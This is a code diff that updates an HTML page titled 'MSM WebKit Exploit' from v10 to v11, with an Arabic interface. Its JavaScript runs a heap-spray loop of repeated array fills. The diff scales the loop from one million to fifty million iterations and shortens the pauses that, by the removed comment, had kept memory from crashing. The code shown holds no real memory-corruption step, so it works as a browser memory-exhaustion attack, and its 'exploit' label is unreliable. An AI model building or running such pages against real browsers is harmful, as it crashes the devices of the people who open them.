@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>MSM WebKit Exploit v10</title>
+    <title>MSM WebKit Exploit v11</title>
     <meta charset="UTF-8" />
     <style>
       body {
@@ -27,8 +27,8 @@
     </style>
   </head>
   <body>
-    <h1>⚡ MSM WebKit Exploit v10 – الضغط الذكي المتدرج</h1>
-    <button onclick="startSmartSpray()">🚀 ابدأ الضغط الذكي</button>
+    <h1>⚡ MSM WebKit Exploit v11 – الضغط الوحشي المتكامل</h1>
+    <button onclick="startMegaSpray()">🚀 ابدأ الضغط الوحشي</button>
     <p id="timer">⏱️ المؤقت: 0 ثانية</p>
     <p id="counter">🔢 التكرارات: 0</p>
     <p id="status">جاهز للتفجير...</p>
@@ -37,13 +37,11 @@
       let seconds = 0;
       let timerInterval = null;
       let counter = 0;
-      let batch = 0;
 
       function startTimer() {
         clearInterval(timerInterval);
         seconds = 0;
         counter = 0;
-        batch = 0;
         document.getElementById("timer").innerText = "⏱️ المؤقت: 0 ثانية";
         document.getElementById("counter").innerText = "🔢 التكرارات: 0";
         timerInterval = setInterval(() => {
@@ -56,12 +54,12 @@
         clearInterval(timerInterval);
       }
 
-      function startSmartSpray() {
+      function startMegaSpray() {
         startTimer();
         const status = document.getElementById("status");
-        status.innerText = "⏳ MSM: بدأ الضغط الذكي...";
-        let limit = 1000000; // مليون تكرار متدرج
-        let chunk = 1000;
+        status.innerText = "⏳ MSM: بدأ الضغط الوحشي...";
+        let limit = 50000000; // 50 مليون تكرار
+        let chunk = 5000;
 
         function sprayChunk() {
           for (let i = 0; i < chunk; i++) {
@@ -69,12 +67,11 @@
             spray.fill(counter);
             counter++;
           }
-          batch++;
           document.getElementById("counter").innerText = `🔢 التكرارات: ${counter}`;
           if (counter < limit) {
-            setTimeout(sprayChunk, 10); // تأخير بسيط لتفادي انهيار الذاكرة
+            setTimeout(sprayChunk, 5); // ضغط متدرج سريع
           } else {
-            status.innerText = "✅ MSM: انتهى الضغط الذكي بنجاح!";
+            status.innerText = "✅ MSM: انتهى الضغط الوحشي بنجاح!";
             stopTimer();
           }
         }
